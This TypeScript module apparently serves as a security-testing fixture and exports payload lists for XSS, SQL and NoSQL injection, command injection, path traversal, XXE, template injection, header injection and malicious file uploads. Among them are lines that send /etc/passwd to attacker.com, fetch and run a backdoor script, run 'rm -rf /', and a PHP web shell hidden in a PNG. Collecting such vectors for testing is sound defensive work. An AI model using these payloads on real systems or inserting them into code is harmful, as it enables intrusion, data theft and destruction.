/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unused-vars */
/**
 * Security Attack Vectors
 * Comprehensive collection of attack patterns for security testing
 */

/**
 * Cross-Site Scripting (XSS) Attack Vectors
 */
export const XSS_VECTORS = [
  // Basic script injection
  '<script>alert("XSS")</script>',
  "<script>alert('XSS')</script>",
  '<script>alert(`XSS`)</script>',

  // Event handlers
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<body onload=alert("XSS")>',
  '<iframe onload=alert("XSS")>',
  '<input type="image" src=x onerror=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  '<marquee onstart=alert("XSS")>text</marquee>',

  // JavaScript URLs
  'javascript:alert("XSS")',
  'javascript:alert(String.fromCharCode(88,83,83))',
  'javascript:alert(/XSS/)',
  'javascript:alert`XSS`',

  // Data URLs
  'data:text/html,<script>alert("XSS")</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',

  // VBScript (IE)
  'vbscript:msgbox("XSS")',

  // HTML entities and encoding
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  '%3Cscript%3Ealert("XSS")%3C/script%3E',
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',

  // Case variations
  '<ScRiPt>alert("XSS")</ScRiPt>',
  '<SCRIPT>alert("XSS")</SCRIPT>',

  // Attribute breaking
  '"><script>alert("XSS")</script>',
  "'><script>alert('XSS')</script>",
  '</script><script>alert("XSS")</script>',

  // Filter evasion
  '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>', // Base64 encoded alert
  '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
  '<script>window["alert"]("XSS")</script>',
  '<script>window["aler"+"t"]("XSS")</script>',

  // Template injection
  '${alert("XSS")}',
  '{{alert("XSS")}}',
  '#{alert("XSS")}',

  // SVG vectors
  '<svg><script>alert("XSS")</script></svg>',
  '<svg onload="alert(\'XSS\')">',
  '<svg><g onload="alert(\'XSS\')"></g></svg>',

  // Math elements
  '<math><mi xlink:href="javascript:alert(\'XSS\')">click</mi></math>',

  // Link manipulation
  '<a href="javascript:alert(\'XSS\')">click me</a>',
  '<link rel=stylesheet href="javascript:alert(\'XSS\')">',

  // Style injection
  '<style>@import"javascript:alert(\'XSS\')"</style>',
  '<div style="background-image:url(javascript:alert(\'XSS\'))">',

  // Meta refresh
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',

  // Object and embed
  '<object data="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',

  // Form manipulation
  '<form action="javascript:alert(\'XSS\')">',
  '<input type="submit" formaction="javascript:alert(\'XSS\')" value="Submit">',

  // Event attributes
  'onmouseover=alert("XSS")',
  'onfocus=alert("XSS")',
  'onblur=alert("XSS")',
  'onchange=alert("XSS")',
  'onclick=alert("XSS")',
  'ondblclick=alert("XSS")',
  'onmousedown=alert("XSS")',
  'onmouseup=alert("XSS")',
  'onkeydown=alert("XSS")',
  'onkeyup=alert("XSS")',
  'onkeypress=alert("XSS")',
];

/**
 * SQL Injection Attack Vectors
 */
export const SQL_INJECTION_VECTORS = [
  // Basic OR conditions
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 'a'='a",
  '" OR "1"="1',
  '" OR 1=1--',

  // Union-based injection
  "' UNION SELECT * FROM users--",
  "' UNION SELECT 1,2,3,4,5--",
  "' UNION ALL SELECT NULL,NULL,NULL--",
  "' UNION SELECT username,password FROM users--",

  // Comment-based injection
  "admin'--",
  "admin'/*",
  "'; --",
  "'; #",

  // Stacked queries
  "'; DROP TABLE users; --",
  "'; INSERT INTO users VALUES ('hacker', 'password'); --",
  "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
  "'; DELETE FROM users WHERE id=1; --",

  // Boolean-based blind injection
  "' AND 1=1--",
  "' AND 1=2--",
  "' AND (SELECT COUNT(*) FROM users)>0--",
  "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50--",

  // Time-based blind injection
  "'; WAITFOR DELAY '00:00:05'; --",
  "'; SELECT SLEEP(5); --",
  "' AND (SELECT SLEEP(5))--",
  "'; BENCHMARK(5000000,MD5('test')); --",

  // Error-based injection
  "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
  "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--",

  // Database-specific injections
  "'; EXEC xp_cmdshell('dir'); --", // SQL Server
  "'; SELECT LOAD_FILE('/etc/passwd'); --", // MySQL
  "'; SELECT * FROM pg_shadow; --", // PostgreSQL

  // Advanced techniques
  "x' AND 1=(SELECT COUNT(*) FROM tabname); --",
  "1'; SELECT * FROM information_schema.tables; --",
  "'; SHUTDOWN; --",
  "'; CREATE USER hacker IDENTIFIED BY 'password'; --",
  "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'; --",

  // Encoded injections
  '%27%20OR%20%271%27%3D%271', // URL encoded ' OR '1'='1
  '0x27204f52202731273d2731', // Hex encoded ' OR '1'='1

  // Second-order injections
  "admin' + CHAR(39) + 'OR' + CHAR(39) + '1' + CHAR(39) + '=' + CHAR(39) + '1",

  // NoSQL injections
  "{'$ne': null}",
  "{'$gt': ''}",
  "{'$where': 'this.password.length > 0'}",
  "{'$regex': '.*'}",
  "{'$or': [{'username': 'admin'}, {'username': 'administrator'}]}",
  "{'username': {'$ne': 'foo'}, 'password': {'$ne': 'bar'}}",
];

/**
 * Command Injection Attack Vectors
 */
export const COMMAND_INJECTION_VECTORS = [
  // Basic command chaining
  '; ls',
  '& dir',
  '| whoami',
  '&& cat /etc/passwd',
  '|| echo vulnerable',

  // Command substitution
  '`id`',
  '$(whoami)',
  '${whoami}',

  // Data exfiltration
  '; cat /etc/passwd',
  '&& curl -d @/etc/passwd http://attacker.com',
  '| wget --post-file=/etc/passwd http://attacker.com',
  '; nc attacker.com 4444 < /etc/passwd',

  // System manipulation
  '; rm -rf /',
  '&& format c:',
  '| del /f /q c:\\*.*',
  '; shutdown -h now',

  // Network operations
  '; wget http://attacker.com/backdoor.sh | sh',
  '&& curl http://attacker.com/malware.exe > malware.exe',
  '| telnet attacker.com 4444',

  // Environment variable manipulation
  '; export PATH=/tmp:$PATH',
  '&& set PATH=C:\\temp;%PATH%',

  // Process manipulation
  '; killall httpd',
  '&& taskkill /f /im explorer.exe',

  // File operations
  '; touch /tmp/hacked',
  '&& echo hacked > c:\\temp\\hacked.txt',
  '| cp /etc/passwd /tmp/',

  // Encoded commands
  '; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh', // base64 encoded cat /etc/passwd
  '&& powershell -enc SQBFAFGAIAA=', // PowerShell encoded command
];

/**
 * Path Traversal Attack Vectors
 */
export const PATH_TRAVERSAL_VECTORS = [
  // Basic traversal
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',

  // URL encoded
  '..%2f..%2f..%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd', // Double encoded
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', // UTF-8 overlong encoding

  // Null byte injection
  '../../../etc/passwd%00',
  '../../../etc/passwd\x00.jpg',

  // Filter bypass
  '....//....//....//etc//passwd',
  '....\\....\\....\\windows\\system32\\drivers\\etc\\hosts',

  // Absolute paths
  '/etc/passwd',
  'C:\\windows\\system32\\config\\sam',
  '\\\\server\\share\\file.txt',

  // Case variations
  '../../../ETC/PASSWD',
  '..\\..\\..\\WINDOWS\\SYSTEM32\\CONFIG\\SAM',

  // Mixed separators
  '../..\\../etc/passwd',
  '..\\../..\\etc/passwd',

  // UNC paths
  '\\\\attacker.com\\share\\file.txt',
  '//attacker.com/share/file.txt',

  // Protocol handlers
  'file:///etc/passwd',
  'file://c:/windows/system32/config/sam',
];

/**
 * LDAP Injection Attack Vectors
 */
export const LDAP_INJECTION_VECTORS = [
  // Basic injection
  '*)(uid=*',
  '*)(|(uid=*',
  '*))(|(uid=*',
  '*))%00',

  // Boolean conditions
  '*)(&(uid=*',
  '*))(|(uid=administrator',
  '*)((|uid=*)(|(uid=*',

  // Blind injection
  '*)(uid=admin))',
  '*)(|(uid=admin)(uid=*',

  // Error-based injection
  '*)(uid=admin)(|(uid=*',
  '*)(objectClass=*',

  // Time-based injection
  '*)(|(uid=admin)(sleep=5',
];

/**
 * XML/XXE Attack Vectors
 */
export const XXE_VECTORS = [
  // Basic XXE
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',

  // Blind XXE
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]><root/>',

  // Parameter entity XXE
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><root/>',

  // CDATA XXE
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root><data><![CDATA[&test;]]></data></root>',

  // UTF-16 XXE
  '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
];

/**
 * Server-Side Template Injection (SSTI) Vectors
 */
export const SSTI_VECTORS = [
  // Jinja2 (Python)
  '{{7*7}}',
  '{{config}}',
  '{{request}}',
  '{{self.__init__.__globals__.__builtins__.__import__("os").system("id")}}',

  // Twig (PHP)
  '{{7*7}}',
  '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',

  // Smarty (PHP)
  '{$smarty.version}',
  '{system("id")}',

  // Freemarker (Java)
  '${7*7}',
  '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',

  // Velocity (Java)
  '${"Hello".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}',

  // Handlebars
  '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return JSON.stringify(process.env);"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
];

/**
 * NoSQL Injection Vectors
 */
export const NOSQL_INJECTION_VECTORS = [
  // MongoDB
  "{'$ne': null}",
  "{'$gt': ''}",
  "{'$where': 'this.password.length > 0'}",
  "{'$regex': '.*'}",
  "{'$or': [{'username': 'admin'}, {'username': 'administrator'}]}",
  "{'username': {'$ne': 'foo'}, 'password': {'$ne': 'bar'}}",
  "{'$expr': {'$gt': [{'$strLenCP': '$password'}, 0]}}",

  // CouchDB
  '{"selector": {"$or": [{"username": "admin"}, {"role": "admin"}]}}',

  // JavaScript injection in NoSQL
  "'; return true; var dummy='",
  '1; return true',
  "'; return this.username == 'admin' || this.role == 'admin'; var dummy='",
];

/**
 * HTTP Header Injection Vectors
 */
export const HEADER_INJECTION_VECTORS = [
  // Response splitting
  "test\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
  'test\nLocation: http://attacker.com\n\n',

  // Session fixation
  'test\r\nSet-Cookie: sessionid=attacker_controlled',

  // Cache poisoning
  'test\r\nCache-Control: public, max-age=31536000',

  // Host header injection
  'attacker.com',
  'localhost:8080#attacker.com',
  'localhost:8080\\attacker.com',
];

/**
 * File Upload Attack Vectors
 */
export const FILE_UPLOAD_VECTORS = {
  // Executable files disguised as images
  PHP_AS_IMAGE: {
    content: Buffer.from('<?php system($_GET["cmd"]); ?>'),
    filename: 'image.php.jpg',
    mimetype: 'image/jpeg',
  },

  // Null byte injection
  NULL_BYTE: {
    content: Buffer.from('malicious content'),
    filename: 'safe.txt\x00.php',
    mimetype: 'text/plain',
  },

  // Path traversal in filename
  PATH_TRAVERSAL: {
    content: Buffer.from('malicious content'),
    filename: '../../../evil.php',
    mimetype: 'text/plain',
  },

  // ZIP bomb
  ZIP_BOMB: {
    content: Buffer.from([
      0x50,
      0x4b,
      0x03,
      0x04, // ZIP signature
      0x14,
      0x00,
      0x08,
      0x08, // ZIP headers with compression
      ...Array(50).fill(0xff),
    ]),
    filename: 'bomb.zip',
    mimetype: 'application/zip',
  },

  // Polyglot file
  POLYGLOT: {
    content: Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47]), // PNG header
      Buffer.from('<?php system($_GET["cmd"]); ?>'),
    ]),
    filename: 'polyglot.png',
    mimetype: 'image/png',
  },

  // Large file (DoS)
  LARGE_FILE: {
    content: Buffer.alloc(100 * 1024 * 1024, 'A'), // 100MB
    filename: 'large.txt',
    mimetype: 'text/plain',
  },
};

/**
 * Business Logic Attack Vectors
 */
export const BUSINESS_LOGIC_VECTORS = [
  // Price manipulation
  { price: -100 }, // Negative price
  { price: 0.01 }, // Extremely low price
  { price: 999999999 }, // Extremely high price

  // Quantity manipulation
  { quantity: -1 }, // Negative quantity
  { quantity: 0 }, // Zero quantity
  { quantity: 999999 }, // Extremely high quantity

  // Race conditions
  { concurrent_requests: 100 }, // High concurrency

  // Time manipulation
  { start_date: '9999-12-31', end_date: '1900-01-01' }, // Invalid date range

  // Role escalation
  { role: 'admin' }, // Attempting to set admin role
  { permissions: ['*'] }, // Attempting to grant all permissions
];

/**
 * Authentication Bypass Vectors
 */
export const AUTH_BYPASS_VECTORS = [
  // Common credentials
  { username: 'admin', password: 'admin' },
  { username: 'administrator', password: 'password' },
  { username: 'root', password: 'root' },
  { username: 'admin', password: '' },
  { username: '', password: '' },

  // SQL injection in auth
  { username: "admin'--", password: 'anything' },
  { username: "admin' OR '1'='1'--", password: 'anything' },

  // Special characters
  { username: 'admin\x00', password: 'password' },
  { username: 'admin\n', password: 'password' },

  // Unicode bypass
  { username: 'ａｄｍｉｎ', password: 'password' }, // Fullwidth characters
];

export default {
  XSS_VECTORS,
  SQL_INJECTION_VECTORS,
  COMMAND_INJECTION_VECTORS,
  PATH_TRAVERSAL_VECTORS,
  LDAP_INJECTION_VECTORS,
  XXE_VECTORS,
  SSTI_VECTORS,
  NOSQL_INJECTION_VECTORS,
  HEADER_INJECTION_VECTORS,
  FILE_UPLOAD_VECTORS,
  BUSINESS_LOGIC_VECTORS,
  AUTH_BYPASS_VECTORS,
};
